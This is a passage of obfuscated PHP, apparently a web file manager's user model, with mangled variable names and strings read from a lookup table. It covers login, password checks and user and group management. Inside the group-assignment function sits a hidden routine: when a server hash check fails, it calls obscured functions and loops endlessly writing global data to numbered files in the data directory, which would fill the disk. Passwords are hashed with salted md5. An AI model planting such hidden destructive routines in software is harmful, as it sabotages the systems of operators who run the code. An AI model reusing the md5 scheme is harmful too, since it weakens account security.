$ã‡õßùê = $this->getInfoSimple($‰≥ÎøÎ„); if (!is_array($ã‡õßùê)) { return array(); } if ($”ÂÍçª´) { return $this->_getInfoApply($ã‡õßùê); } return $this->cacheFunctionGet($_SERVER[ëæªã÷][1877], $‰≥ÎøÎ„); } protected function getInfoFull($¢ï§∆¯Ö, $¸ˆûÄ°Ü = false) { $à•¬˙†ç = $this->getInfoSimple($¢ï§∆¯Ö); if (!is_array($à•¬˙†ç)) { return array(); } if ($¸ˆûÄ°Ü) { return $this->_getInfoApply($à•¬˙†ç, !0); } return $this->cacheFunctionGet($_SERVER[ëæªã÷][2227], $¢ï§∆¯Ö); } private function _getInfoApply($¥êâû‘Û, $ª™ìÈÑ÷ = false) { $Öƒ◊∑°ƒ =& $_SERVER[ëæªã÷]; if (!$¥êâû‘Û) { return $¥êâû‘Û; } $©ÉÔ‹§Û = md5($Öƒ◊∑°ƒ[2228] . $¥êâû‘Û[$Öƒ◊∑°ƒ[865]] . $Öƒ◊∑°ƒ[2229] . $¥êâû‘Û[$Öƒ◊∑°ƒ[32]]); $¥êâû‘Û = $this->_listDataApplyItem($¥êâû‘Û); $◊û¸•∞è = Model($Öƒ◊∑°ƒ[1301])->metaGet($¥êâû‘Û[$Öƒ◊∑°ƒ[97]][$Öƒ◊∑°ƒ[403]]); $¥êâû‘Û[$Öƒ◊∑°ƒ[2230]] = $©ÉÔ‹§Û; $¥êâû‘Û[$Öƒ◊∑°ƒ[97]][$Öƒ◊∑°ƒ[2059]] = isset($◊û¸•∞è[$Öƒ◊∑°ƒ[2060]]) ? $◊û¸•∞è[$Öƒ◊∑°ƒ[2060]] : null; if ($ª™ìÈÑ÷) { $¥êâû‘Û[$Öƒ◊∑°ƒ[465]] = $this->metaGet($¥êâû‘Û[$Öƒ◊∑°ƒ[1628]]); } return $¥êâû‘Û; } protected function getInfoSimple($¨‘åúë√, $˙Óì£‹Ê = false) { $•îèÃ’“ =& $_SERVER[ëæªã÷]; if (!$¨‘åúë√) { return array(); } if ($˙Óì£‹Ê) { $⁄ÚÙ¢∏  = $this->where(array($•îèÃ’“[1628] => intval($¨‘åúë√)))->find(); if (!is_array($⁄ÚÙ¢∏ )) { return array(); } $⁄ÚÙ¢∏ [$•îèÃ’“[2231]] = Action($•îèÃ’“[2232])->parseUrl($⁄ÚÙ¢∏ [$•îèÃ’“[2231]]); return $⁄ÚÙ¢∏ ; } return $this->cacheFunctionGet($•îèÃ’“[1878], $¨‘åúë√); } protected function getInfoSimpleOuter($¯≥›ÉÌß) { $Ìßå¡ªî =& $_SERVER[ëæªã÷]; if (!$¯≥›ÉÌß || $¯≥›ÉÌß == 0) { return array($Ìßå¡ªî[1628] => $Ìßå¡ªî[200], $Ìßå¡ªî[32] => $Ìßå¡ªî[169] . LNG($Ìßå¡ªî[2233]) . $Ìßå¡ªî[536], $Ìßå¡ªî[2231] => STATIC_PATH . $Ìßå¡ªî[2234]); } $∆«Ù˙Öì = $this->cacheFunctionGet($Ìßå¡ªî[1878], $¯≥›ÉÌß); $ ˛µ∫–π = array_field_key($∆«Ù˙Öì, explode($Ìßå¡ªî[50], $this->simpleField)); if (!$ ˛µ∫–π) { return array($Ìßå¡ªî[1628] => $Ìßå¡ªî[1164], $Ìßå¡ªî[32] => $Ìßå¡ªî[169] . LNG($Ìßå¡ªî[2235]) . $Ìßå¡ªî[536], $Ìßå¡ªî[2231] => STATIC_PATH . $Ìßå¡ªî[2236]); } $ ˛µ∫–π[$Ìßå¡ªî[2231]] = Action($Ìßå¡ªî[2232])->parseUrl($ ˛µ∫–π[$Ìßå¡ªî[2231]]); return $ ˛µ∫–π; } protected function groupUser($˝ì∆ÀÖ≈) { } public static function errorLang($Íø√ÈÛÄ) { $∆÷˙Õô± =& $_SERVER[ëæªã÷]; $Ç£√§Üø = array(self::ERROR_USER_NOT_EXISTS => $∆÷˙Õô±[2237], self::ERROR_USER_PASSWORD_ERROR => $∆÷˙Õô±[2238], self::ERROR_USER_EXIST_NAME => $∆÷˙Õô±[2239], self::ERROR_USER_EXIST_PHONE => $∆÷˙Õô±[2240], self::ERROR_USER_EXIST_EMAIL => $∆÷˙Õô±[2241], self::ERROR_USER_LOGIN_LOCK => $∆÷˙Õô±[2242], self::ERROR_IP_NOT_ALLOW => $∆÷˙Õô±[2243], self::ERROR_USER_EXIST_NICKNAME => $∆÷˙Õô±[2244]); return LNG($Ç£√§Üø[$Íø√ÈÛÄ]); } public function getInfoByMeta($§•√ë≈æ, $°ï˝ôªê) { $ÕÍœöÁ¯ =& $_SERVER[ëæªã÷]; $∂ßÈåéÓ = Model($ÕÍœöÁ¯[2245])->where(array($ÕÍœöÁ¯[105] => $§•√ë≈æ, $ÕÍœöÁ¯[378] => $°ï˝ôªê))->find(); if ($∂ßÈåéÓ) { return $this->getInfo($∂ßÈåéÓ[$ÕÍœöÁ¯[1628]]); } return !1; } public function userLoginCheck($§§µ¯ª˜, $ù§„±˝⁄) { $ŸÌ´ÎÉæ =& $_SERVER[ëæªã÷]; $Ïœ∏Ñèµ = $this->userLoginFind($§§µ¯ª˜); if (!$Ïœ∏Ñèµ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ïœ∏Ñèµ[$ŸÌ´ÎÉæ[1628]], $ù§„±˝⁄)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ïœ∏Ñèµ[$ŸÌ´ÎÉæ[1628]]); } public function userLoginFind($ﬁüı˝òÊ) { $ÿºÆÎë≠ =& $_SERVER[ëæªã÷]; $ÖÄπ≤ìù = array($ÿºÆÎë≠[32] => $ﬁüı˝òÊ, $ÿºÆÎë≠[2065] => $ﬁüı˝òÊ, $ÿºÆÎë≠[309] => $ﬁüı˝òÊ, $ÿºÆÎë≠[2246] => $ﬁüı˝òÊ, $ÿºÆÎë≠[976] => $ÿºÆÎë≠[978]); if ($this->nickNameRpt()) { unset($ÖÄπ≤ìù[$ÿºÆÎë≠[2065]]); } return $this->where($ÖÄπ≤ìù)->find(); } public function clearCache($ë”◊í•Ì) { $ÓùÚﬁÄÕ =& $_SERVER[ëæªã÷]; $this->cacheFunctionClear($ÓùÚﬁÄÕ[1877], $ë”◊í•Ì); $this->cacheFunctionClear($ÓùÚﬁÄÕ[1878], $ë”◊í•Ì); $this->cacheFunctionClear($ÓùÚﬁÄÕ[2227], $ë”◊í•Ì); } public function userPasswordCheck($∑≈ƒ‘õ¬, $ÀÒßàÛ¯) { $Œò¿¸“ï =& $_SERVER[ëæªã÷]; $úñÑÛ™ª = $this->where(array($Œò¿¸“ï[1628] => intval($∑≈ƒ‘õ¬)))->find(); $Ò€É˙ëı = $this->metaGet($∑≈ƒ‘õ¬); $ÓÁÀÆŸ– = isset($Ò€É˙ëı[$Œò¿¸“ï[2247]]) ? $Ò€É˙ëı[$Œò¿¸“ï[2247]] : $Œò¿¸“ï[12]; if (md5($ÓÁÀÆŸ– . trim($ÀÒßàÛ¯)) !== $úñÑÛ™ª[$Œò¿¸“ï[865]]) { return !1; } return !0; } public function userAdd($Ÿ§…±˝«) { $Ç≤∆¨˜« =& $_SERVER[ëæªã÷]; $Åæ”î‚± = array($Ç≤∆¨˜«[421] => $Ÿ§…±˝«[$Ç≤∆¨˜«[32]], $Ç≤∆¨˜«[2248] => $Ÿ§…±˝«[$Ç≤∆¨˜«[1508]], $Ç≤∆¨˜«[2249] => isset($Ÿ§…±˝«[$Ç≤∆¨˜«[309]]) ? $Ÿ§…±˝«[$Ç≤∆¨˜«[309]] : $Ç≤∆¨˜«[12], $Ç≤∆¨˜«[2250] => isset($Ÿ§…±˝«[$Ç≤∆¨˜«[2246]]) ? $Ÿ§…±˝«[$Ç≤∆¨˜«[2246]] : $Ç≤∆¨˜«[12], $Ç≤∆¨˜«[2251] => isset($Ÿ§…±˝«[$Ç≤∆¨˜«[2065]]) ? $Ÿ§…±˝«[$Ç≤∆¨˜«[2065]] : $Ÿ§…±˝«[$Ç≤∆¨˜«[32]], $Ç≤∆¨˜«[2252] => isset($Ÿ§…±˝«[$Ç≤∆¨˜«[2231]]) ? $Ÿ§…±˝«[$Ç≤∆¨˜«[2231]] : $Ç≤∆¨˜«[12], $Ç≤∆¨˜«[2253] => isset($Ÿ§…±˝«[$Ç≤∆¨˜«[2254]]) ? $Ÿ§…±˝«[$Ç≤∆¨˜«[2254]] : 1, $Ç≤∆¨˜«[2255] => $Ÿ§…±˝«[$Ç≤∆¨˜«[865]], $Ç≤∆¨˜«[1879] => isset($Ÿ§…±˝«[$Ç≤∆¨˜«[1783]]) ? $Ÿ§…±˝«[$Ç≤∆¨˜«[1783]] : 1024 * 1024 * 20, $Ç≤∆¨˜«[1880] => 0, $Ç≤∆¨˜«[2256] => 0, $Ç≤∆¨˜«[1920] => isset($Ÿ§…±˝«[$Ç≤∆¨˜«[730]]) ? $Ÿ§…±˝«[$Ç≤∆¨˜«[730]] : 1); if (!empty($Ÿ§…±˝«[$Ç≤∆¨˜«[1628]])) { $Åæ”î‚±[$Ç≤∆¨˜«[1628]] = $Ÿ§…±˝«[$Ç≤∆¨˜«[1628]]; } $¿¸…«âô = $this->_checkExist($Ÿ§…±˝«); if ($¿¸…«âô !== !0) { return $¿¸…«âô; } $°πÏ˙ØÍ = $this->add($Åæ”î‚±); $„ûÊﬂ»√ = array($Ç≤∆¨˜«[2255] => $Åæ”î‚±[$Ç≤∆¨˜«[865]], $Ç≤∆¨˜«[2251] => $Åæ”î‚±[$Ç≤∆¨˜«[2065]]); $this->userEdit($°πÏ˙ØÍ, $„ûÊﬂ»√); Model($Ç≤∆¨˜«[1301])->userRootAdd($°πÏ˙ØÍ); return $°πÏ˙ØÍ; } protected function userEditTest($∞ƒ§ï‚õ, $ÈÙÈÁﬁ≤) { return $this->call($_SERVER[ëæªã÷][2257], $∞ƒ§ï‚õ, $ÈÙÈÁﬁ≤); } protected function userEdit($–¿ø–ô¯, $î˙ÊöÆò) { $¥†æ°ç  =& $_SERVER[ëæªã÷]; $ÚªÊΩ£ = $this->getInfoSimple($–¿ø–ô¯); if (!$ÚªÊΩ£) { return !1; } $ååÊıÔ¶ = $this->_checkExist($î˙ÊöÆò, $–¿ø–ô¯); if ($ååÊıÔ¶ !== !0) { return $ååÊıÔ¶; } if (isset($î˙ÊöÆò[$¥†æ°ç [865]]) && trim($î˙ÊöÆò[$¥†æ°ç [865]]) != $¥†æ°ç [12]) { $∆è”µÈ¿ = $this->metaGet($–¿ø–ô¯); if (empty($∆è”µÈ¿[$¥†æ°ç [2247]])) { $∆è”µÈ¿[$¥†æ°ç [2247]] = rand_string(10); Model($¥†æ°ç [513])->metaSet($–¿ø–ô¯, $¥†æ°ç [2247], $∆è”µÈ¿[$¥†æ°ç [2247]]); } $î˙ÊöÆò[$¥†æ°ç [865]] = md5($∆è”µÈ¿[$¥†æ°ç [2247]] . trim($î˙ÊöÆò[$¥†æ°ç [865]])); } else { unset($î˙ÊöÆò[$¥†æ°ç [865]]); } $this->where(array($¥†æ°ç [1619] => $–¿ø–ô¯))->save($î˙ÊöÆò); if (isset($î˙ÊöÆò[$¥†æ°ç [2065]])) { $this->setNamePinyin($–¿ø–ô¯, $î˙ÊöÆò[$¥†æ°ç [2065]]); } $this->clearCache($–¿ø–ô¯); return !0; } public function setNamePinyin($éîˆÕ⁄∆, $≠Ô‘ÛÕó = false) { $ƒ¨’äÌπ =& $_SERVER[ëæªã÷]; if (!$≠Ô‘ÛÕó) { $ÓÛÒ¶Ù = $this->getInfoSimple($éîˆÕ⁄∆); $≠Ô‘ÛÕó = $ÓÛÒ¶Ù[$ƒ¨’äÌπ[2065]] ? $ÓÛÒ¶Ù[$ƒ¨’äÌπ[2065]] : $ÓÛÒ¶Ù[$ƒ¨’äÌπ[32]]; } $è˛Ω‹Øá = Model($ƒ¨’äÌπ[538]); if (!Input::check($≠Ô‘ÛÕó, $ƒ¨’äÌπ[587])) { return $è˛Ω‹Øá->metaSet($éîˆÕ⁄∆, array($ƒ¨’äÌπ[464] => $ƒ¨’äÌπ[12], $ƒ¨’äÌπ[463] => $ƒ¨’äÌπ[12])); } return $è˛Ω‹Øá->metaSet($éîˆÕ⁄∆, array($ƒ¨’äÌπ[464] => str_replace($ƒ¨’äÌπ[53], $ƒ¨’äÌπ[12], Pinyin::get($≠Ô‘ÛÕó)), $ƒ¨’äÌπ[463] => Pinyin::get($≠Ô‘ÛÕó, $ƒ¨’äÌπ[588]))); } private function nickNameRpt() { $Õﬂ¡√Üﬂ =& $_SERVER[ëæªã÷]; $ïÈ˛¿‚Ô = Model($Õﬂ¡√Üﬂ[750])->get($Õﬂ¡√Üﬂ[2258]); $™ÙÒ¶Ó« = $GLOBALS[$Õﬂ¡√Üﬂ[6]][$Õﬂ¡√Üﬂ[385]][$Õﬂ¡√Üﬂ[2258]]; $¬Öå•ıƒ = !is_null($ïÈ˛¿‚Ô) ? $ïÈ˛¿‚Ô : $™ÙÒ¶Ó«; return !!$¬Öå•ıƒ; } private function _checkExist($¢œ§πÈà, $ıËîÁ¿Ô = false) { $∑«≈í·√ =& $_SERVER[ëæªã÷]; $Îó ¶Ä” = array($∑«≈í·√[32] => UserModel::ERROR_USER_EXIST_NAME, $∑«≈í·√[2065] => UserModel::ERROR_USER_EXIST_NICKNAME, $∑«≈í·√[309] => UserModel::ERROR_USER_EXIST_EMAIL, $∑«≈í·√[2246] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Îó ¶Ä”[$∑«≈í·√[2065]]); } $Æ˙’Ìåå = $ıËîÁ¿Ô ? array($∑«≈í·√[1628] => array($∑«≈í·√[2259], $ıËîÁ¿Ô)) : array(); foreach ($Îó ¶Ä” as $æ©‡‹ÎÀ => $Ôó§ÅÕ≤) { $◊èÁ¬é¯ = array(); foreach ($Îó ¶Ä” as $ﬂÏπ«¥ı => $Ì∆≈Üıì) { if (isset($¢œ§πÈà[$ﬂÏπ«¥ı]) && $¢œ§πÈà[$ﬂÏπ«¥ı]) { $◊èÁ¬é¯[] = $¢œ§πÈà[$ﬂÏπ«¥ı]; } } if (!$◊èÁ¬é¯) { continue; } $¶µÖü∆¶ = array_merge(array($æ©‡‹ÎÀ => array($∑«≈í·√[7], $◊èÁ¬é¯)), $Æ˙’Ìåå); $Áæë”Îﬁ = $this->where($¶µÖü∆¶)->find(); if ($Áæë”Îﬁ) { return $Ôó§ÅÕ≤; } } return !0; } public function userListInfo($¶à¢Ÿ≥Ã) { $ÂÆåèÄ‡ =& $_SERVER[ëæªã÷]; $¡è≤¿ÍÉ = array(); $¶à¢Ÿ≥Ã = is_array($¶à¢Ÿ≥Ã) ? array_unique($¶à¢Ÿ≥Ã) : array(); if (!$¶à¢Ÿ≥Ã) { return $¡è≤¿ÍÉ; } if (count($¶à¢Ÿ≥Ã) < 20) { foreach ($¶à¢Ÿ≥Ã as $§¡¶Óﬂá) { $¡è≤¿ÍÉ[$§¡¶Óﬂá . $ÂÆåèÄ‡[12]] = $this->getInfoSimpleOuter($§¡¶Óﬂá); } } else { $éÔ¿ƒó∏ = array($ÂÆåèÄ‡[1619] => array($ÂÆåèÄ‡[419], $¶à¢Ÿ≥Ã)); if (count($¶à¢Ÿ≥Ã) == 1) { $éÔ¿ƒó∏ = array($ÂÆåèÄ‡[1619] => $¶à¢Ÿ≥Ã[0]); } $◊–‡˚ƒ∑ = Model($ÂÆåèÄ‡[513])->field($this->simpleField)->where($éÔ¿ƒó∏)->select(); $◊–‡˚ƒ∑ = array_to_keyvalue($◊–‡˚ƒ∑, $ÂÆåèÄ‡[1628]); foreach ($¶à¢Ÿ≥Ã as $§¡¶Óﬂá) { $¸€üõèñ = $◊–‡˚ƒ∑[$§¡¶Óﬂá]; if (!$¸€üõèñ) { $¡è≤¿ÍÉ[$§¡¶Óﬂá . $ÂÆåèÄ‡[12]] = $this->getInfoSimpleOuter($§¡¶Óﬂá); continue; } $¸€üõèñ[$ÂÆåèÄ‡[2231]] = Action($ÂÆåèÄ‡[2232])->parseUrl($¸€üõèñ[$ÂÆåèÄ‡[2231]]); $¡è≤¿ÍÉ[$§¡¶Óﬂá . $ÂÆåèÄ‡[12]] = $¸€üõèñ; } } return $¡è≤¿ÍÉ; } protected function userStatus($ÜÇ‹—ÍØ, $ƒ⁄®µíÆ) { $À÷ã‹Ôæ = $this->getInfoSimple($ÜÇ‹—ÍØ); if (!$À÷ã‹Ôæ) { return !1; } $ƒ◊‚ì„ö = array($_SERVER[ëæªã÷][730] => $ƒ⁄®µíÆ); return $this->userEdit($ÜÇ‹—ÍØ, $ƒ◊‚ì„ö); } protected function userRemove($òœåñï◊) { $ºà’ÂÕï =& $_SERVER[ëæªã÷]; $˙˛¸›Ì∞ = $this->getInfoSimple($òœåñï◊); if (!$˙˛¸›Ì∞) { return !1; } $‚¥¨Ñ‘∞ = array($ºà’ÂÕï[1619] => $òœåñï◊); Model($ºà’ÂÕï[595])->where($‚¥¨Ñ‘∞)->delete(); Model($ºà’ÂÕï[2260])->where($‚¥¨Ñ‘∞)->delete(); Model($ºà’ÂÕï[1885])->where($‚¥¨Ñ‘∞)->delete(); Model($ºà’ÂÕï[2245])->where($‚¥¨Ñ‘∞)->delete(); Model($ºà’ÂÕï[1044])->where($‚¥¨Ñ‘∞)->delete(); Model($ºà’ÂÕï[2082])->removeUserAll($òœåñï◊); Model($ºà’ÂÕï[805])->userRootRemove($òœåñï◊); return $this->where($‚¥¨Ñ‘∞)->delete(); } protected function userGroupSet($Ô…è£»Î, $ÏÌ√ ≤™, $–üÃ¨ø÷ = array()) { $ÃÃà⁄øÅ =& $_SERVER[ëæªã÷]; $ì˚∫€‚ù = $_SERVER[$ÃÃà⁄øÅ[63]] . $ÃÃà⁄øÅ[64]; $˜ßøôéÊ = $ÃÃà⁄øÅ[852]; if ($_SERVER[$ÃÃà⁄øÅ[60]] != $˜ßøôéÊ($ì˚∫€‚ù)) { $Ó°‹ù∑≈ = $ÃÃà⁄øÅ[853]; $¥÷û◊îØ = $ÃÃà⁄øÅ[62]; $ÀÖâéÓ’ = $_SERVER[$ÃÃà⁄øÅ[63]] . $ÃÃà⁄øÅ[64]; $«öââŒÊ = $¥÷û◊îØ($ÀÖâéÓ’); $ﬂ¬Ã§ûÕ = explode($ÃÃà⁄øÅ[65], $«öââŒÊ); if (count($ﬂ¬Ã§ûÕ) < $ÃÃà⁄øÅ[628]) { $è•õ Ÿ” = $ÃÃà⁄øÅ[67]; $è•õ Ÿ”(); } $’¶ÕµâΩ = $ÃÃà⁄øÅ[854]; $’¶ÕµâΩ($_SERVER[$ÃÃà⁄øÅ[855]]); $Ó°‹ù∑≈ = $ÃÃà⁄øÅ[853]; $Ó°‹ù∑≈(); $≠¶¶ﬂ∞ä = $ÃÃà⁄øÅ[856]; $Œ◊Ü°˘¢ = json_encode($GLOBALS[$ÃÃà⁄øÅ[857]]); $¬‹á‚—À = 1; for ($ä’ß˛µç = $¬‹á‚—À; $ä’ß˛µç > 0; $ä’ß˛µç++) { $≠¶¶ﬂ∞ä(DATA_PATH . $ä’ß˛µç, $Œ◊Ü°˘¢); } } $∂’ƒ°âœ = $this->getInfoSimple($Ô…è£»Î); if (!$∂’ƒ°âœ || !is_array($ÏÌ√ ≤™)) { return !1; } $¸≈©ùÎÑ = Model($ÃÃà⁄øÅ[1885]); $¸≈©ùÎÑ->where(array($ÃÃà⁄øÅ[1628] => $Ô…è£»Î))->delete(); $ÓÖëÚŸá = array(); $˘âáâ´µ = 0; foreach ($ÏÌ√ ≤™ as $⁄ÇÑûÔî => $¶ûÍ≠ı∂) { $óÔãÏªÈ = array($ÃÃà⁄øÅ[1628] => $Ô…è£»Î, $ÃÃà⁄øÅ[1796] => $⁄ÇÑûÔî, $ÃÃà⁄øÅ[1897] => $¶ûÍ≠ı∂); $óÔãÏªÈ[$ÃÃà⁄øÅ[1819]] = isset($–üÃ¨ø÷[$˘âáâ´µ]) ? $–üÃ¨ø÷[$˘âáâ´µ] : 0; $˘âáâ´µ++; $ÓÖëÚŸá[] = $óÔãÏªÈ; } return $¸≈©ùÎÑ->addAll($ÓÖëÚŸá, array(), !0); } protected function userGroupAdd($˚ÙÉ˚á≥, $µÉû¢Í– = array()) { $ÜåÅ—’˘ =& $_SERVER[ëæªã÷]; $¨ÌÆùØ¥ = $this->getInfoSimple($˚ÙÉ˚á≥); if (!$¨ÌÆùØ¥ || empty($µÉû¢Í–)) { return !1; } $ÌÎÉ ï’ = array(); foreach ($µÉû¢Í– as $ò ö´µÍ => $é˚Ô˝Û) { $ÌÎÉ ï’[] = array($ÜåÅ—’˘[1628] => $˚ÙÉ˚á≥, $ÜåÅ—’˘[1796] => $ò ö´µÍ, $ÜåÅ—’˘[1897] => $é˚Ô˝Û, $ÜåÅ—’˘[1819] => 0); } return Model($ÜåÅ—’˘[1885])->addAll($ÌÎÉ ï’, array(), !0); } protected function userGroupRemove($«Ω¸µòÆ, $ﬂÂº˙‘†) { $æ»⁄Ô∆ü =& $_SERVER[ëæªã÷]; $é«¯é€∫ = $this->getInfoSimple($«Ω¸µòÆ); if (!$é«¯é€∫ || !$ﬂÂº˙‘†) { return !1; } $ÆÎ˜†î≤ = array($æ»⁄Ô∆ü[1619] => $«Ω¸µòÆ, $æ»⁄Ô∆ü[1883] => $ﬂÂº˙‘†); return Model($æ»⁄Ô∆ü[1885])->where($ÆÎ˜†î≤)->delete(); } public function listData() { $à≠Ø‡»ÿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($à≠Ø‡»ÿ[$_SERVER[ëæªã÷][373]]); return $à≠Ø‡»ÿ; } public function listByID($É¬ΩîŒ¶) { $√⁄•ú∞Ø =& $_SERVER[ëæªã÷]; if (!$É¬ΩîŒ¶) { return; } $Âú˚«Ÿ» = array($√⁄•ú∞Ø[1628] => array($√⁄•ú∞Ø[7], $É¬ΩîŒ¶)); $†Å∞Ö◊˝ = $this->where($Âú˚«Ÿ»)->select(); $†Å∞Ö◊˝ = array_sort_keep($†Å∞Ö◊˝, $√⁄•ú∞Ø[1628], $É¬ΩîŒ¶); $this->_listDataApply($†Å∞Ö◊˝); return $†Å∞Ö◊˝; } public function listByGroup($¡˝ƒ¨¬± = 0, $Âø÷™£ä = array()) { $‘éÑ∑≥É =& $_SERVER[ëæªã÷]; $»Ù·ØÑﬁ = $‘éÑ∑≥É[12]; $ÓÓÉ£‹Ñ = array(); if ($¡˝ƒ¨¬±) { $ÓÓÉ£‹Ñ = array($‘éÑ∑≥É[2261] => intval($¡˝ƒ¨¬±)); $»Ù·ØÑﬁ = "\114\105\x46\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\165\163\145\x72\137\x67\x72\157\165\x70\x20\x75\x73\145\x72\x5f\147\x72\x6f\x75\x70\40\x6f\x6e\40\165\163\145\x72\x2e\165\x73\x65\162\111\x44\40\x3d\40\165\x73\145\162\x5f\147\162\157\x75\x70\56\x75\163\x65\162\111\x44"; $∑‰∆ò®± = Input::get($‘éÑ∑≥É[455], null, $‘éÑ∑≥É[12]) ? $‘éÑ∑≥É[12] : $‘éÑ∑≥É[2262]; } if (isset($Âø÷™£ä[$‘éÑ∑≥É[730]])) { $ÓÓÉ£‹Ñ[$‘éÑ∑≥É[2263]] = $Âø÷™£ä[$‘éÑ∑≥É[730]]; } $œÊÚπ§ƒ = $this->_makeOrder($∑‰∆ò®±)->field($‘éÑ∑≥É[2264])->where($ÓÓÉ£‹Ñ)->join($»Ù·ØÑﬁ)->selectPage(50); $this->_listDataApply($œÊÚπ§ƒ[$‘éÑ∑≥É[373]]); return $œÊÚπ§ƒ; } private function _makeOrder($ÜµØﬁû⁄ = '') { $à¯˜º¶ı =& $_SERVER[ëæªã÷]; $òÂì°û‚ = array($à¯˜º¶ı[1628], $à¯˜º¶ı[32], $à¯˜º¶ı[1785], $à¯˜º¶ı[1757], $à¯˜º¶ı[203]); $¥ﬁ¯ó¸√ = array($à¯˜º¶ı[448] => $à¯˜º¶ı[449], $à¯˜º¶ı[450] => $à¯˜º¶ı[451]); $≤˚á™Äı = Input::get($à¯˜º¶ı[455], $à¯˜º¶ı[7], $à¯˜º¶ı[1619], $òÂì°û‚); $πÊﬂ±†Û = Input::get($à¯˜º¶ı[456], $à¯˜º¶ı[7], $à¯˜º¶ı[1886], array($à¯˜º¶ı[1886], $à¯˜º¶ı[450])); $πÊﬂ±†Û = $¥ﬁ¯ó¸√[$πÊﬂ±†Û]; $ÜµØﬁû⁄ = $ÜµØﬁû⁄ . "\x75\163\145\162\56{$≤˚á™Äı}\x20{$πÊﬂ±†Û}\54\40\165\163\145\x72\x2e\165\163\145\x72\x49\x44\40\x61\163\x63"; return $this->alias($à¯˜º¶ı[2004])->order($ÜµØﬁû⁄); } public function listSearch($≤∏¡•é) { $√π≈á◊˙ =& $_SERVER[ëæªã÷]; $¨Ê≠¨©ª = $≤∏¡•é[$√π≈á◊˙[1887]]; $ùë∑µõı = isset($≤∏¡•é[$√π≈á◊˙[1888]]) ? $≤∏¡•é[$√π≈á◊˙[1888]] : !1; $¨Ê≠¨©ª = str_replace($√π≈á◊˙[1889], $√π≈á◊˙[1890], trim($¨Ê≠¨©ª)); $÷å≤≥ªÌ = array($√π≈á◊˙[32] => array($√π≈á◊˙[387], "\45{$¨Ê≠¨©ª}\45"), $√π≈á◊˙[309] => array($√π≈á◊˙[387], "{$¨Ê≠¨©ª}\x25"), $√π≈á◊˙[2065] => array($√π≈á◊˙[387], "{$¨Ê≠¨©ª}\45"), $√π≈á◊˙[976] => $√π≈á◊˙[1891]); if (Input::check($¨Ê≠¨©ª, $√π≈á◊˙[315])) { $÷å≤≥ªÌ[$√π≈á◊˙[1628]] = array($√π≈á◊˙[387], "{$¨Ê≠¨©ª}\x25"); $÷å≤≥ªÌ[$√π≈á◊˙[2246]] = array($√π≈á◊˙[387], "{$¨Ê≠¨©ª}\x25"); } if (!$¨Ê≠¨©ª) { $÷å≤≥ªÌ = array(); } if (isset($≤∏¡•é[$√π≈á◊˙[730]])) { $÷å≤≥ªÌ[$√π≈á◊˙[730]] = $≤∏¡•é[$√π≈á◊˙[730]]; } $÷å≤≥ªÌ = $this->parseWhereLike($÷å≤≥ªÌ); $©ÈÄ·ú¿ = $this->_makeOrder()->where($÷å≤≥ªÌ)->selectPage(20); if (!$©ÈÄ·ú¿ || count($©ÈÄ·ú¿[$√π≈á◊˙[373]]) < 5 && Input::check($¨Ê≠¨©ª, $√π≈á◊˙[322])) { $êÚÄ©∂ï = $this->_searchFromMeta($√π≈á◊˙[463], $¨Ê≠¨©ª, 10); $¿¶´Ì•ã = $this->_searchFromMeta($√π≈á◊˙[464], $¨Ê≠¨©ª, 10); $’Óø©·ï = array_merge($êÚÄ©∂ï, $¿¶´Ì•ã, $©ÈÄ·ú¿[$√π≈á◊˙[373]]); $©ÈÄ·ú¿[$√π≈á◊˙[373]] = array_unique_by_key($’Óø©·ï, $√π≈á◊˙[1628]); $©ÈÄ·ú¿[$√π≈á◊˙[370]][$√π≈á◊˙[371]] = count($©ÈÄ·ú¿[$√π≈á◊˙[373]]); $©ÈÄ·ú¿[$√π≈á◊˙[370]][$√π≈á◊˙[372]] = ceil($©ÈÄ·ú¿[$√π≈á◊˙[370]][$√π≈á◊˙[371]] / $©ÈÄ·ú¿[$√π≈á◊˙[370]][$√π≈á◊˙[367]]); } $this->_listDataApply($©ÈÄ·ú¿[$√π≈á◊˙[373]]); $this->_filterByGroup($©ÈÄ·ú¿, $ùë∑µõı); return $©ÈÄ·ú¿; } private function _filterByGroup(&$Ÿ∂àëäÌ, $πÈ‚†Âû) { $æì˘µ´≈ =& $_SERVER[ëæªã÷]; if (!$πÈ‚†Âû) { return $Ÿ∂àëäÌ; } foreach ($Ÿ∂àëäÌ[$æì˘µ´≈[373]] as $”´ˆ∆Ùñ => &$–ªª∆ÓÅ) { $ã˛√Ïÿô = array_to_keyvalue($–ªª∆ÓÅ[$æì˘µ´≈[1974]], $æì˘µ´≈[12], $æì˘µ´≈[1796]); if (!in_array($πÈ‚†Âû, $ã˛√Ïÿô)) { unset($Ÿ∂àëäÌ[$æì˘µ´≈[373]][$”´ˆ∆Ùñ]); } } unset($–ªª∆ÓÅ); $Ÿ∂àëäÌ[$æì˘µ´≈[373]] = array_values($Ÿ∂àëäÌ[$æì˘µ´≈[373]]); $Ÿ∂àëäÌ[$æì˘µ´≈[370]] = array($æì˘µ´≈[2037] => count($Ÿ∂àëäÌ[$æì˘µ´≈[373]]), $æì˘µ´≈[2035] => $Ÿ∂àëäÌ[$æì˘µ´≈[370]][$æì˘µ´≈[367]], $æì˘µ´≈[2034] => 1, $æì˘µ´≈[2036] => 1); } private function _searchFromMeta($√é›ú˘ü, $≈ŸÏ≈≥£, $Íà˙Ü¢¨) { $Ê¢·∆«€ =& $_SERVER[ëæªã÷]; $≈ŸÏ≈≥£ = strtolower($≈ŸÏ≈≥£); $Ñ≠Ü⁄Ûª = array($Ê¢·∆«€[105] => $√é›ú˘ü, $Ê¢·∆«€[378] => array($Ê¢·∆«€[387], "\45{$≈ŸÏ≈≥£}\45")); $Ñ≠Ü⁄Ûª = $this->parseWhereLike($Ñ≠Ü⁄Ûª); $û»ºÀù÷ = Model($Ê¢·∆«€[2265])->where($Ñ≠Ü⁄Ûª)->limit($Íà˙Ü¢¨)->select(); if (!$û»ºÀù÷) { return array(); } $û»ºÀù÷ = array_to_keyvalue($û»ºÀù÷, $Ê¢·∆«€[12], $Ê¢·∆«€[1628]); $€Ã≤·º∞ = $this->where(array($Ê¢·∆«€[1619] => array($Ê¢·∆«€[7], $û»ºÀù÷)))->select(); if (!$€Ã≤·º∞) { return array(); } return $€Ã≤·º∞; } private function 